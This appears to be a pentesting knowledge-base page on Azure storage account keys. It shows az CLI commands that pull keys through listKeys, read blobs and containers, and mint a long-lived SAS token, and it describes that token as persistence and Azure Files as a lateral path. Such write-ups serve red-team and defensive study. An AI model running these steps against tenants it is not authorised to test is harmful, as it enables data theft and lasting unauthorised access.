---
title: "Storage keys: listKeys for full data-plane access"
description: "Recovering Azure storage account keys through listKeys to gain full data-plane access to blobs, files, tables, and queues."
keywords:
  - storage account key
  - listKeys
  - data plane
  - blob
  - full access
---

# Storage keys

A storage account's two **access keys** grant unconditional, full control of its data plane: every blob, file share, table, and queue, regardless of RBAC. The management-plane action `Microsoft.Storage/storageAccounts/listKeys/action` (held by Contributor and many custom roles) returns them, turning management access into total data access.

## Listing and using the key

```bash
az storage account keys list --account-name <acct> --query '[0].value' -o tsv

KEY=$(az storage account keys list --account-name <acct> --query '[0].value' -o tsv)
az storage blob list --account-name <acct> --account-key "$KEY" --container-name <c>
az storage container list --account-name <acct> --account-key "$KEY"
```

With the key you can also mint a SAS token for durable, scoped access that survives a key holder's session:

```bash
az storage account generate-sas --account-name <acct> --account-key "$KEY" \
  --services bfqt --resource-types sco --permissions rwdlacup \
  --expiry 2030-01-01 -o tsv
```

## Exploitation notes

- The key bypasses Azure RBAC entirely: a principal denied blob-data roles but allowed `listKeys` still reads and writes all data.
- A self-minted SAS is durable persistence: it keeps working until the account key is rotated, and rotation is rare.
- Keys also unlock Azure Files shares that may be mounted by VMs, a lateral path to hosts.

## Tools

- **az cli** (`storage account keys list`, `storage blob`).
- **MicroBurst** (`Get-AzPasswords`): collects storage keys alongside other secrets.
- **Azure Storage Explorer**: browse with the recovered key.

## References

- [Microsoft: manage storage account keys](https://learn.microsoft.com/azure/storage/common/storage-account-keys-manage)
- [HackTricks Cloud: Azure storage](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/index.html)
- [NetSPI: MicroBurst](https://github.com/NetSPI/MicroBurst)
